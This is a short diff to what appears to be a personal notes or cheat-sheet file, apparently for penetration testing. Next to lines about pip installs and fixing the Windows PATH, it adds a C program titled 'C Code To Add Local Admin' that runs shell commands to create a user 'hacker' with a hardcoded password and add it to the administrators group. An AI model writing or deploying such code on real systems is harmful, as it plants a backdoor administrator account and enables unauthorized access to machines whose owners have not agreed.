@@ -3219,6 +3219,20 @@ run
 	pip install -r requirements.txt
   	deactivate
 
-  # Fixing Path In Windows
+# Fixing Path In Windows
   	set PATH=%SystemRoot%\system32;%SystemRoot%;
-       
+
+# C Code To Add Local Admin
+```
+	#include <stdlib.h>
+
+int main(){
+
+	int i;
+	i = system ("net user hacker password123 /add");
+	i = system ("net localgroup administrators hacker /add");
+
+	return 0;
+}
+```
+
